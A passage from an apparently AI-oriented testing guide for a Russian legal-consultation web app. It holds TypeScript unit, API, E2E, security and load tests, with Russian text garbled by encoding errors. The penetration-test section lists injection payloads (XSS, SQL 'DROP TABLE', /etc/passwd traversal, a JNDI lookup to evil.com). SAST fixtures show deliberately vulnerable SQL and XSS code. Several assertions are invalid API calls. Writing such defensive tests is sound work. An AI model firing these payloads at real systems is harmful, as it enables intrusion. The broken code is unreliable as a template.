      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(false);
      expect(result.error).toBe('Telegram API error');
      expect(result.status).toBe('failed');
    });
  });
});
```

---

## ğŸ”— Integration Testing

### **1. API Testing**

#### **REST API Testing**
```typescript
// tests/integration/api/legal-consultation.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { app } from '@/app';
import { TestEnvironment } from '@/tests/setup/test-environment';

describe('Legal Consultation API', () => {
  let testEnv: TestEnvironment;
  let authToken: string;

  beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
    authToken = await testEnv.createAuthToken('test-user');
  });

  afterAll(async () => {
    await testEnv.cleanup();
  });

  describe('POST /api/legal/consultation', () => {
    it('should create legal consultation', async () => {
      // Arrange
      const consultationData = {
        message: 'ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€ Ğ½ĞµĞ½Ğ°Ğ´Ğ»ĞµĞ¶Ğ°Ñ‰ĞµĞ³Ğ¾ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ°?',
        context: {
          area: 'consumer',
          jurisdiction: 'russia',
          urgency: 'medium',
          complexity: 'simple'
        }
      };

      // Act
      const response = await request(app)
        .post('/api/legal/consultation')
        .set('Authorization', `Bearer ${authToken}`)
        .send(consultationData)
        .expect(200);

      // Assert
      expect(response.body).toMatchObject({
        success: true,
        data: {
          id: expect.any(String),
          answer: expect.any(String),
          sources: expect.any(Array),
          confidence: expect.any(Number),
          suggestions: expect.any(Array)
        }
      });

      expect(response.body.data.answer).toContain('Ñ‚Ğ¾Ğ²Ğ°Ñ€');
      expect(response.body.data.confidence).toBeGreaterThan(0.7);
    });

    it('should validate input data', async () => {
      // Arrange
      const invalidData = {
        message: '', // ĞŸÑƒÑÑ‚Ğ¾Ğµ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ
        context: {
          area: 'invalid_area' // ĞĞµĞ²ĞµÑ€Ğ½Ğ°Ñ Ğ¾Ğ±Ğ»Ğ°ÑÑ‚ÑŒ Ğ¿Ñ€Ğ°Ğ²Ğ°
        }
      };

      // Act & Assert
      await request(app)
        .post('/api/legal/consultation')
        .set('Authorization', `Bearer ${authToken}`)
        .send(invalidData)
        .expect(400)
        .expect((res) => {
          expect(res.body.error).toContain('validation');
        });
    });

    it('should handle rate limiting', async () => {
      // Arrange
      const consultationData = {
        message: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ğ¾Ğµ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ',
        context: {
          area: 'consumer',
          jurisdiction: 'russia',
          urgency: 'low',
          complexity: 'simple'
        }
      };

      // Act - Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµĞ¼ Ğ¼Ğ½Ğ¾Ğ³Ğ¾ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ¾Ğ² Ğ¿Ğ¾Ğ´Ñ€ÑĞ´
      const promises = Array(10).fill(null).map(() =>
        request(app)
          .post('/api/legal/consultation')
          .set('Authorization', `Bearer ${authToken}`)
          .send(consultationData)
      );

      const responses = await Promise.all(promises);

      // Assert - Ğ½ĞµĞºĞ¾Ñ‚Ğ¾Ñ€Ñ‹Ğµ Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹ Ğ´Ğ¾Ğ»Ğ¶Ğ½Ñ‹ Ğ±Ñ‹Ñ‚ÑŒ Ğ·Ğ°Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ñ‹
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('GET /api/legal/consultation/:id', () => {
    it('should retrieve consultation by ID', async () => {
      // Arrange
      const consultation = await testEnv.createConsultation({
        userId: 'test-user',
        message: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ',
        answer: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğ¹ Ğ¾Ñ‚Ğ²ĞµÑ‚'
      });

      // Act
      const response = await request(app)
        .get(`/api/legal/consultation/${consultation.id}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      // Assert
      expect(response.body.data).toMatchObject({
        id: consultation.id,
        message: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ',
        answer: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğ¹ Ğ¾Ñ‚Ğ²ĞµÑ‚'
      });
    });

    it('should return 404 for non-existent consultation', async () => {
      // Act & Assert
      await request(app)
        .get('/api/legal/consultation/non-existent-id')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);
    });
  });
});
```

### **2. Database Testing**

#### **Database Integration Testing**
```typescript
// tests/integration/database/user-repository.test.ts
import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { UserRepository } from '@/lib/database/repositories/user-repository';
import { TestDatabase } from '@/tests/setup/test-database';

describe('UserRepository', () => {
  let testDb: TestDatabase;
  let userRepository: UserRepository;

  beforeAll(async () => {
    testDb = await TestDatabase.create();
    userRepository = new UserRepository(testDb.connection);
  });

  afterAll(async () => {
    await testDb.cleanup();
  });

  beforeEach(async () => {
    await testDb.clear();
  });

  describe('create', () => {
    it('should create user successfully', async () => {
      // Arrange
      const userData = {
        telegramId: '123456789',
        firstName: 'Ğ˜Ğ²Ğ°Ğ½',
        lastName: 'ĞŸĞµÑ‚Ñ€Ğ¾Ğ²',
        username: 'ivan_petrov',
        languageCode: 'ru'
      };

      // Act
      const user = await userRepository.create(userData);

      // Assert
      expect(user).toMatchObject({
        id: expect.any(String),
        telegramId: '123456789',
        firstName: 'Ğ˜Ğ²Ğ°Ğ½',
        lastName: 'ĞŸĞµÑ‚Ñ€Ğ¾Ğ²',
        username: 'ivan_petrov',
        languageCode: 'ru',
        createdAt: expect.any(Date)
      });

      // ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼, Ñ‡Ñ‚Ğ¾ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ÑŒ ÑĞ¾Ñ…Ñ€Ğ°Ğ½ĞµĞ½ Ğ² Ğ±Ğ°Ğ·Ğµ
      const savedUser = await userRepository.findByTelegramId('123456789');
      expect(savedUser).toEqual(user);
    });

    it('should handle duplicate telegram ID', async () => {
      // Arrange
      const userData = {
        telegramId: '123456789',
        firstName: 'Ğ˜Ğ²Ğ°Ğ½',
        lastName: 'ĞŸĞµÑ‚Ñ€Ğ¾Ğ²'
      };

      await userRepository.create(userData);

      // Act & Assert
      await expect(
        userRepository.create(userData)
      ).rejects.toThrow('duplicate key');
    });
  });

  describe('update', () => {
    it('should update user successfully', async () => {
      // Arrange
      const user = await userRepository.create({
        telegramId: '123456789',
        firstName: 'Ğ˜Ğ²Ğ°Ğ½',
        lastName: 'ĞŸĞµÑ‚Ñ€Ğ¾Ğ²'
      });

      // Act
      const updatedUser = await userRepository.update(user.id, {
        firstName: 'ĞŸĞµÑ‚Ñ€',
        lastName: 'Ğ˜Ğ²Ğ°Ğ½Ğ¾Ğ²'
      });

      // Assert
      expect(updatedUser).toMatchObject({
        id: user.id,
        firstName: 'ĞŸĞµÑ‚Ñ€',
        lastName: 'Ğ˜Ğ²Ğ°Ğ½Ğ¾Ğ²'
      });
    });
  });

  describe('findByTelegramId', () => {
    it('should find user by Telegram ID', async () => {
      // Arrange
      const user = await userRepository.create({
        telegramId: '123456789',
        firstName: 'Ğ˜Ğ²Ğ°Ğ½',
        lastName: 'ĞŸĞµÑ‚Ñ€Ğ¾Ğ²'
      });

      // Act
      const foundUser = await userRepository.findByTelegramId('123456789');

      // Assert
      expect(foundUser).toEqual(user);
    });

    it('should return null for non-existent user', async () => {
      // Act
      const foundUser = await userRepository.findByTelegramId('999999999');

      // Assert
      expect(foundUser).toBeNull();
    });
  });
});
```

---

## ğŸ­ End-to-End Testing

### **1. Playwright E2E Testing**

#### **Critical User Journeys**
```typescript
// tests/e2e/legal-consultation.spec.ts
import { test, expect } from '@playwright/test';
import { TestEnvironment } from '@/tests/setup/test-environment';

test.describe('Legal Consultation Flow', () => {
  let testEnv: TestEnvironment;

  test.beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
  });

  test.afterAll(async () => {
    await testEnv.cleanup();
  });

  test('should complete full legal consultation journey', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await page.goto('/');

    // Act 1: ĞÑ‚ĞºÑ€Ñ‹Ğ²Ğ°ĞµĞ¼ Ñ‡Ğ°Ñ‚
    await page.click('[data-testid="open-chat"]');
    await expect(page.locator('[data-testid="chat-interface"]')).toBeVisible();

    // Act 2: ĞÑ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµĞ¼ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ
    await page.fill('[data-testid="chat-input"]', 'ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€ Ğ½ĞµĞ½Ğ°Ğ´Ğ»ĞµĞ¶Ğ°Ñ‰ĞµĞ³Ğ¾ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ°?');
    await page.click('[data-testid="send-message"]');

    // Assert 2: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼, Ñ‡Ñ‚Ğ¾ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¾
    await expect(page.locator('[data-testid="user-message"]')).toContainText('ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€');

    // Act 3: Ğ–Ğ´ĞµĞ¼ Ğ¾Ñ‚Ğ²ĞµÑ‚ Ğ¾Ñ‚ AI
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Assert 3: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ¾ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ°
    const aiResponse = page.locator('[data-testid="ai-response"]');
    await expect(aiResponse).toContainText('Ñ‚Ğ¾Ğ²Ğ°Ñ€');
    await expect(aiResponse).toContainText('14 Ğ´Ğ½ĞµĞ¹');

    // Act 4: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼ Ğ¸ÑÑ‚Ğ¾Ñ‡Ğ½Ğ¸ĞºĞ¸
    await expect(page.locator('[data-testid="sources"]')).toBeVisible();
    const sources = page.locator('[data-testid="source-item"]');
    await expect(sources).toHaveCount.greaterThan(0);

    // Act 5: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼ Ğ¿Ñ€ĞµĞ´Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ñ
    await expect(page.locator('[data-testid="suggestions"]')).toBeVisible();
    const suggestions = page.locator('[data-testid="suggestion-item"]');
    await expect(suggestions).toHaveCount.greaterThan(0);

    // Act 6: ĞšĞ»Ğ¸ĞºĞ°ĞµĞ¼ Ğ½Ğ° Ğ¿Ñ€ĞµĞ´Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ "Ğ¡Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€Ğ¾Ğ²Ğ°Ñ‚ÑŒ Ğ´Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚"
    const generateDocSuggestion = page.locator('[data-testid="suggestion-item"]').filter({ hasText: 'Ğ¡Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€Ğ¾Ğ²Ğ°Ñ‚ÑŒ Ğ´Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚' });
    if (await generateDocSuggestion.isVisible()) {
      await generateDocSuggestion.click();
      
      // Assert 6: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼, Ñ‡Ñ‚Ğ¾ Ğ¾Ñ‚ĞºÑ€Ñ‹Ğ»ÑÑ Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ‚Ğ¾Ñ€ Ğ´Ğ¾ĞºÑƒĞ¼ĞµĞ½Ñ‚Ğ¾Ğ²
      await expect(page.locator('[data-testid="document-generator"]')).toBeVisible();
    }
  });

  test('should handle AI service errors gracefully', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await testEnv.mockAIServiceError();
    await page.goto('/');

    // Act
    await page.click('[data-testid="open-chat"]');
    await page.fill('[data-testid="chat-input"]', 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğ¹ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ');
    await page.click('[data-testid="send-message"]');

    // Assert
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
    await expect(page.locator('[data-testid="error-message"]')).toContainText('ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¿Ğ¾Ğ»ÑƒÑ‡ĞµĞ½Ğ¸Ğ¸ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ°');
  });

  test('should maintain conversation context', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await page.goto('/');

    // Act 1: ĞŸĞµÑ€Ğ²Ñ‹Ğ¹ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ
    await page.click('[data-testid="open-chat"]');
    await page.fill('[data-testid="chat-input"]', 'Ğ£ Ğ¼ĞµĞ½Ñ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ° Ñ Ñ‚Ğ¾Ğ²Ğ°Ñ€Ğ¾Ğ¼');
    await page.click('[data-testid="send-message"]');
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Act 2: Ğ’Ñ‚Ğ¾Ñ€Ğ¾Ğ¹ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ Ñ ĞºĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚Ğ¾Ğ¼
    await page.fill('[data-testid="chat-input"]', 'Ğ§Ñ‚Ğ¾ Ğ´ĞµĞ»Ğ°Ñ‚ÑŒ Ğ´Ğ°Ğ»ÑŒÑˆĞµ?');
    await page.click('[data-testid="send-message"]');
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Assert: ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼, Ñ‡Ñ‚Ğ¾ AI Ğ¿Ğ¾Ğ½Ğ¸Ğ¼Ğ°ĞµÑ‚ ĞºĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚
    const secondResponse = page.locator('[data-testid="ai-response"]').last();
    await expect(secondResponse).toContainText('Ñ‚Ğ¾Ğ²Ğ°Ñ€');
  });
});
```

### **2. Cross-Platform Testing**

#### **Mobile and Desktop Testing**
```typescript
// tests/e2e/cross-platform.spec.ts
import { test, expect, devices } from '@playwright/test';

test.describe('Cross-Platform Compatibility', () => {
  test('should work on mobile devices', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 375, height: 667 }); // iPhone SE

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="mobile-menu"]')).toBeVisible();
    await expect(page.locator('[data-testid="chat-interface"]')).toBeVisible();
  });

  test('should work on tablet devices', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 768, height: 1024 }); // iPad

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="tablet-layout"]')).toBeVisible();
  });

  test('should work on desktop', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 1920, height: 1080 }); // Desktop

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="desktop-layout"]')).toBeVisible();
  });
});
```

---

## ğŸ¤– AI-Powered Testing

### **1. AI Test Generation**

#### **Automated Test Case Generation**
```typescript
// tests/ai/test-generator.ts
import { AITestGenerator } from '@/lib/testing/ai-test-generator';
import { TestCaseGenerator } from '@/lib/testing/test-case-generator';

export class AITestGenerator {
  private openai: OpenAI;
  private testCaseGenerator: TestCaseGenerator;

  constructor() {
    this.openai = new OpenAI({
      apiKey: process.env.OPENAI_API_KEY
    });
    this.testCaseGenerator = new TestCaseGenerator();
  }

  async generateTestCases(
    component: string, 
    requirements: string[]
  ): Promise<GeneratedTestCase[]> {
    const prompt = `
      Ğ¡Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞ¹ Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğµ ÑĞ»ÑƒÑ‡Ğ°Ğ¸ Ğ´Ğ»Ñ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚Ğ°: ${component}
      
      Ğ¢Ñ€ĞµĞ±Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ:
      ${requirements.map(req => `- ${req}`).join('\n')}
      
      Ğ¡Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞ¹ Ñ‚ĞµÑÑ‚Ñ‹ Ğ´Ğ»Ñ:
      1. Happy path scenarios
      2. Edge cases
      3. Error conditions
      4. Accessibility requirements
      5. Performance requirements
      
      Ğ¤Ğ¾Ñ€Ğ¼Ğ°Ñ‚ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ°: JSON Ğ¼Ğ°ÑÑĞ¸Ğ² Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ñ… ÑĞ»ÑƒÑ‡Ğ°ĞµĞ²
    `;

    const response = await this.openai.chat.completions.create({
      model: 'gpt-4o',
      messages: [{ role: 'user', content: prompt }],
      temperature: 0.7
    });

    const testCases = JSON.parse(response.choices[0].message.content);
    return this.validateAndEnhanceTestCases(testCases);
  }

  async generateVisualTestCases(
    component: string
  ): Promise<VisualTestCase[]> {
    const prompt = `
      Ğ¡Ğ³ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞ¹ Ğ²Ğ¸Ğ·ÑƒĞ°Ğ»ÑŒĞ½Ñ‹Ğµ Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ğµ ÑĞ»ÑƒÑ‡Ğ°Ğ¸ Ğ´Ğ»Ñ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚Ğ°: ${component}
      
      Ğ’ĞºĞ»ÑÑ‡Ğ¸:
      1. Ğ Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ğµ ÑĞ¾ÑÑ‚Ğ¾ÑĞ½Ğ¸Ñ ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚Ğ°
      2. Ğ Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ğµ Ñ€Ğ°Ğ·Ğ¼ĞµÑ€Ñ‹ ÑĞºÑ€Ğ°Ğ½Ğ°
      3. Ğ Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ğµ Ñ‚ĞµĞ¼Ñ‹ (ÑĞ²ĞµÑ‚Ğ»Ğ°Ñ/Ñ‚ĞµĞ¼Ğ½Ğ°Ñ)
      4. Ğ Ğ°Ğ·Ğ»Ğ¸Ñ‡Ğ½Ñ‹Ğµ ÑĞ·Ñ‹ĞºĞ¸
      5. Accessibility ÑĞ¾ÑÑ‚Ğ¾ÑĞ½Ğ¸Ñ
      
      Ğ¤Ğ¾Ñ€Ğ¼Ğ°Ñ‚ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ°: JSON Ğ¼Ğ°ÑÑĞ¸Ğ² Ğ²Ğ¸Ğ·ÑƒĞ°Ğ»ÑŒĞ½Ñ‹Ñ… Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ñ… ÑĞ»ÑƒÑ‡Ğ°ĞµĞ²
    `;

    const response = await this.openai.chat.completions.create({
      model: 'gpt-4o',
      messages: [{ role: 'user', content: prompt }],
      temperature: 0.5
    });

    return JSON.parse(response.choices[0].message.content);
  }

  private validateAndEnhanceTestCases(
    testCases: any[]
  ): GeneratedTestCase[] {
    return testCases.map(testCase => ({
      id: generateId(),
      name: testCase.name,
      description: testCase.description,
      steps: testCase.steps,
      expectedResult: testCase.expectedResult,
      priority: testCase.priority || 'medium',
      category: testCase.category || 'functional',
      tags: testCase.tags || [],
      generatedAt: new Date(),
      confidence: testCase.confidence || 0.8
    }));
  }
}
```

### **2. Intelligent Test Selection**

#### **Smart Test Execution**
```typescript
// tests/ai/intelligent-test-selector.ts
export class IntelligentTestSelector {
  private testHistory: TestExecutionHistory;
  private changeAnalyzer: ChangeAnalyzer;
  private riskAnalyzer: RiskAnalyzer;

  async selectTestsForExecution(
    changes: CodeChange[]
  ): Promise<SelectedTests> {
    // 1. ĞĞ½Ğ°Ğ»Ğ¸Ğ·Ğ¸Ñ€ÑƒĞµĞ¼ Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ¸Ñ
    const changeImpact = await this.changeAnalyzer.analyzeChanges(changes);
    
    // 2. ĞÑ†ĞµĞ½Ğ¸Ğ²Ğ°ĞµĞ¼ Ñ€Ğ¸ÑĞºĞ¸
    const riskAssessment = await this.riskAnalyzer.assessRisks(changeImpact);
    
    // 3. Ğ’Ñ‹Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ Ñ‚ĞµÑÑ‚Ñ‹ Ğ½Ğ° Ğ¾ÑĞ½Ğ¾Ğ²Ğµ Ğ¸ÑÑ‚Ğ¾Ñ€Ğ¸Ğ¸
    const relevantTests = await this.selectRelevantTests(changeImpact);
    
    // 4. ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ¸Ñ€ÑƒĞµĞ¼ Ñ‚ĞµÑÑ‚Ñ‹
    const prioritizedTests = await this.prioritizeTests(relevantTests, riskAssessment);
    
    return {
      unit: prioritizedTests.unit,
      integration: prioritizedTests.integration,
      e2e: prioritizedTests.e2e,
      estimatedDuration: this.calculateEstimatedDuration(prioritizedTests),
      confidence: this.calculateConfidence(prioritizedTests)
    };
  }

  private async selectRelevantTests(
    changeImpact: ChangeImpact
  ): Promise<RelevantTests> {
    const relevantTests: RelevantTests = {
      unit: [],
      integration: [],
      e2e: []
    };

    // Ğ’Ñ‹Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ unit Ñ‚ĞµÑÑ‚Ñ‹ Ğ´Ğ»Ñ Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ½Ñ‹Ñ… ĞºĞ¾Ğ¼Ğ¿Ğ¾Ğ½ĞµĞ½Ñ‚Ğ¾Ğ²
    for (const component of changeImpact.modifiedComponents) {
      const componentTests = await this.testHistory.getTestsForComponent(component);
      relevantTests.unit.push(...componentTests.unit);
    }

    // Ğ’Ñ‹Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ integration Ñ‚ĞµÑÑ‚Ñ‹ Ğ´Ğ»Ñ Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ½Ñ‹Ñ… API
    for (const api of changeImpact.modifiedAPIs) {
      const apiTests = await this.testHistory.getTestsForAPI(api);
      relevantTests.integration.push(...apiTests);
    }

    // Ğ’Ñ‹Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ E2E Ñ‚ĞµÑÑ‚Ñ‹ Ğ´Ğ»Ñ ĞºÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸Ñ… Ğ¿ÑƒÑ‚ĞµĞ¹
    if (changeImpact.affectsCriticalPath) {
      const criticalPathTests = await this.testHistory.getCriticalPathTests();
      relevantTests.e2e.push(...criticalPathTests);
    }

    return relevantTests;
  }

  private async prioritizeTests(
    tests: RelevantTests,
    riskAssessment: RiskAssessment
  ): Promise<PrioritizedTests> {
    const prioritized: PrioritizedTests = {
      unit: [],
      integration: [],
      e2e: []
    };

    // ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚Ğ¸Ğ·Ğ¸Ñ€ÑƒĞµĞ¼ Ğ½Ğ° Ğ¾ÑĞ½Ğ¾Ğ²Ğµ Ñ€Ğ¸ÑĞºĞ° Ğ¸ Ğ¸ÑÑ‚Ğ¾Ñ€Ğ¸Ğ¸
    for (const test of tests.unit) {
      const priority = this.calculateTestPriority(test, riskAssessment);
      prioritized.unit.push({ ...test, priority });
    }

    // Ğ¡Ğ¾Ñ€Ñ‚Ğ¸Ñ€ÑƒĞµĞ¼ Ğ¿Ğ¾ Ğ¿Ñ€Ğ¸Ğ¾Ñ€Ğ¸Ñ‚ĞµÑ‚Ñƒ
    prioritized.unit.sort((a, b) => b.priority - a.priority);
    prioritized.integration.sort((a, b) => b.priority - a.priority);
    prioritized.e2e.sort((a, b) => b.priority - a.priority);

    return prioritized;
  }
}
```

---

## ğŸ”’ Security Testing

### **1. Automated Security Testing**

#### **SAST, DAST, IAST Integration**
```typescript
// tests/security/security-test-suite.ts
import { describe, it, expect } from 'vitest';
import { SecurityTestRunner } from '@/lib/security/security-test-runner';
import { VulnerabilityScanner } from '@/lib/security/vulnerability-scanner';

describe('Security Test Suite', () => {
  let securityRunner: SecurityTestRunner;
  let vulnerabilityScanner: VulnerabilityScanner;

  beforeAll(async () => {
    securityRunner = new SecurityTestRunner();
    vulnerabilityScanner = new VulnerabilityScanner();
  });

  describe('SAST (Static Application Security Testing)', () => {
    it('should detect SQL injection vulnerabilities', async () => {
      // Arrange
      const codeSnippet = `
        const query = \`SELECT * FROM users WHERE id = \${userId}\`;
        const result = await db.query(query);
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'sql_injection',
        severity: 'high',
        line: 2,
        description: 'Potential SQL injection vulnerability'
      });
    });

    it('should detect XSS vulnerabilities', async () => {
      // Arrange
      const codeSnippet = `
        const userInput = req.body.comment;
        res.send(\`<div>\${userInput}</div>\`);
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'xss',
        severity: 'medium',
        line: 3,
        description: 'Potential XSS vulnerability'
      });
    });

    it('should detect hardcoded secrets', async () => {
      // Arrange
      const codeSnippet = `
        const apiKey = 'sk-1234567890abcdef';
        const password = 'admin123';
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'hardcoded_secret',
        severity: 'critical',
        line: 2,
        description: 'Hardcoded API key detected'
      });
    });
  });

  describe('DAST (Dynamic Application Security Testing)', () => {
    it('should test for common web vulnerabilities', async () => {
      // Act
      const vulnerabilities = await securityRunner.runDAST({
        target: 'http://localhost:3000',
        scanType: 'comprehensive'
      });

      // Assert
      expect(vulnerabilities).toHaveLength(0);
    });

    it('should test authentication endpoints', async () => {
      // Act
      const authVulnerabilities = await securityRunner.runDAST({
        target: 'http://localhost:3000/api/auth',
        scanType: 'authentication'
      });

      // Assert
      expect(authVulnerabilities).toHaveLength(0);
    });
  });

  describe('IAST (Interactive Application Security Testing)', () => {
    it('should detect runtime vulnerabilities', async () => {
      // Act
      const runtimeVulnerabilities = await securityRunner.runIAST({
        application: 'lawerapp',
        monitoring: true
      });

      // Assert
      expect(runtimeVulnerabilities).toHaveLength(0);
    });
  });
});
```

### **2. Penetration Testing**

#### **Automated Penetration Testing**
```typescript
// tests/security/penetration-testing.ts
import { describe, it, expect } from 'vitest';
import { PenetrationTester } from '@/lib/security/penetration-tester';

describe('Penetration Testing', () => {
  let penetrationTester: PenetrationTester;

  beforeAll(async () => {
    penetrationTester = new PenetrationTester();
  });

  describe('Authentication Testing', () => {
    it('should test for weak authentication', async () => {
      // Act
      const results = await penetrationTester.testAuthentication({
        target: 'http://localhost:3000/api/auth',
        testCases: [
          'brute_force',
          'session_fixation',
          'csrf',
          'jwt_manipulation'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
      expect(results.recommendations).toHaveLength.greaterThan(0);
    });
  });

  describe('Input Validation Testing', () => {
    it('should test for injection attacks', async () => {
      // Act
      const results = await penetrationTester.testInputValidation({
        target: 'http://localhost:3000/api/legal/consultation',
        payloads: [
          '<script>alert("xss")</script>',
          "'; DROP TABLE users; --",
          '../../../etc/passwd',
          '${jndi:ldap://evil.com/a}'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
    });
  });

  describe('Authorization Testing', () => {
    it('should test for privilege escalation', async () => {
      // Act
      const results = await penetrationTester.testAuthorization({
        target: 'http://localhost:3000/api',
        testCases: [
          'horizontal_privilege_escalation',
          'vertical_privilege_escalation',
          'idor',
          'path_traversal'
        ]
      });

      // Assert
      expect(results.vulnerabilities).toHaveLength(0);
    });
  });
});
```

---

## ğŸ“Š Performance Testing

### **1. Load Testing**

#### **Performance Test Suite**
```typescript
// tests/performance/load-testing.ts
import { describe, it, expect } from 'vitest';
import { LoadTester } from '@/lib/performance/load-tester';
import { PerformanceMonitor } from '@/lib/performance/performance-monitor';

describe('Performance Testing', () => {
  let loadTester: LoadTester;
  let performanceMonitor: PerformanceMonitor;

  beforeAll(async () => {
    loadTester = new LoadTester();
